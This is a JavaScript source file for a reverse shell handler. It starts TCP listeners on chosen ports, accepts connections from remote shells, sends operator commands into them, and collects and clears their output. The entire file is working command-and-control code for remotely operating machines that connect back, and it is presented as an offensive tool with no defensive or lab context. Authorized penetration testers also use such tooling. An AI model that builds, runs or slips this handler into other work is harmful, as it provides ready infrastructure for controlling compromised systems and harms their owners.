/**
 * Reverse Shell Handler
 * Manages reverse shell listeners and connections
 */

const net = require('net');
const { spawn } = require('child_process');
const EventEmitter = require('events');

class ReverseShellHandler extends EventEmitter {
  constructor() {
    super();
    this.listeners = new Map();
    this.shells = new Map();
    this.shellCounter = 0;
  }

  /**
   * Start listening on a port for reverse shell connections
   */
  startListener(port) {
    if (this.listeners.has(port)) {
      return { success: false, error: `Listener already active on port ${port}` };
    }

    try {
      const server = net.createServer((socket) => {
        this.handleNewConnection(socket, port);
      });

      server.on('error', (err) => {
        console.error(`Listener error on port ${port}:`, err);
        this.listeners.delete(port);
        this.emit('error', { port, error: err.message });
      });

      server.listen(port, '0.0.0.0', () => {
        console.log(`✓ Reverse shell listener started on port ${port}`);
      });

      this.listeners.set(port, {
        server: server,
        port: port,
        startedAt: new Date().toISOString(),
        connectionCount: 0,
      });

      this.emit('listener-started', { port });
      return { success: true, port };
    } catch (err) {
      return { success: false, error: err.message };
    }
  }

  /**
   * Stop listening on a port
   */
  stopListener(port) {
    const listener = this.listeners.get(port);
    if (!listener) {
      return { success: false, error: `No listener found on port ${port}` };
    }

    try {
      listener.server.close();
      this.listeners.delete(port);

      // Close any active shells from this listener
      this.shells.forEach((shell, shellId) => {
        if (shell.listenerPort === port) {
          this.closeShell(shellId);
        }
      });

      this.emit('listener-stopped', { port });
      return { success: true, message: `Listener on port ${port} closed` };
    } catch (err) {
      return { success: false, error: err.message };
    }
  }

  /**
   * Handle new connection to listener
   */
  handleNewConnection(socket, port) {
    const shellId = ++this.shellCounter;
    const listener = this.listeners.get(port);

    if (listener) {
      listener.connectionCount++;
    }

    const shell = {
      id: shellId,
      listenerPort: port,
      remoteAddress: socket.remoteAddress,
      remotePort: socket.remotePort,
      connectedAt: new Date().toISOString(),
      socket: socket,
      output: '',
      isAlive: true,
    };

    this.shells.set(shellId, shell);

    // Handle incoming data
    socket.on('data', (data) => {
      shell.output += data.toString();
      this.emit('shell-output', {
        shellId: shellId,
        data: data.toString(),
        timestamp: new Date().toISOString(),
      });
    });

    // Handle connection close
    socket.on('end', () => {
      shell.isAlive = false;
      this.emit('shell-closed', { shellId, reason: 'client disconnected' });
      this.shells.delete(shellId);
    });

    // Handle errors
    socket.on('error', (err) => {
      shell.isAlive = false;
      this.emit('shell-error', { shellId, error: err.message });
      this.shells.delete(shellId);
    });

    this.emit('shell-connected', {
      shellId,
      remoteAddress: socket.remoteAddress,
      remotePort: socket.remotePort,
    });
  }

  /**
   * Execute command on a connected shell
   */
  executeCommandOnShell(shellId, command) {
    const shell = this.shells.get(shellId);
    if (!shell) {
      return { success: false, error: `Shell ${shellId} not found` };
    }

    if (!shell.isAlive) {
      return { success: false, error: `Shell ${shellId} is not connected` };
    }

    try {
      shell.socket.write(command + '\n');
      return { success: true, shellId, command };
    } catch (err) {
      return { success: false, error: err.message };
    }
  }

  /**
   * Get list of active shells
   */
  getActiveShells() {
    const shells = [];
    this.shells.forEach((shell, shellId) => {
      shells.push({
        id: shellId,
        remoteAddress: shell.remoteAddress,
        remotePort: shell.remotePort,
        listenerPort: shell.listenerPort,
        connectedAt: shell.connectedAt,
        isAlive: shell.isAlive,
      });
    });
    return shells;
  }

  /**
   * Get list of active listeners
   */
  getActiveListeners() {
    const listeners = [];
    this.listeners.forEach((listener, port) => {
      listeners.push({
        port: port,
        startedAt: listener.startedAt,
        connectionCount: listener.connectionCount,
      });
    });
    return listeners;
  }

  /**
   * Close a shell connection
   */
  closeShell(shellId) {
    const shell = this.shells.get(shellId);
    if (shell && shell.isAlive) {
      try {
        shell.socket.destroy();
        shell.isAlive = false;
      } catch (err) {
        console.error('Error closing shell:', err);
      }
    }
    this.shells.delete(shellId);
  }

  /**
   * Get shell output
   */
  getShellOutput(shellId) {
    const shell = this.shells.get(shellId);
    if (!shell) {
      return null;
    }
    return shell.output;
  }

  /**
   * Clear shell output buffer
   */
  clearShellOutput(shellId) {
    const shell = this.shells.get(shellId);
    if (shell) {
      shell.output = '';
    }
  }

  /**
   * Shutdown all listeners
   */
  shutdownAll() {
    // Close all shells
    this.shells.forEach((shell) => {
      try {
        shell.socket.destroy();
      } catch (err) {
        console.error('Error closing shell:', err);
      }
    });
    this.shells.clear();

    // Close all listeners
    this.listeners.forEach((listener) => {
      try {
        listener.server.close();
      } catch (err) {
        console.error('Error closing listener:', err);
      }
    });
    this.listeners.clear();
  }
}

module.exports = new ReverseShellHandler();
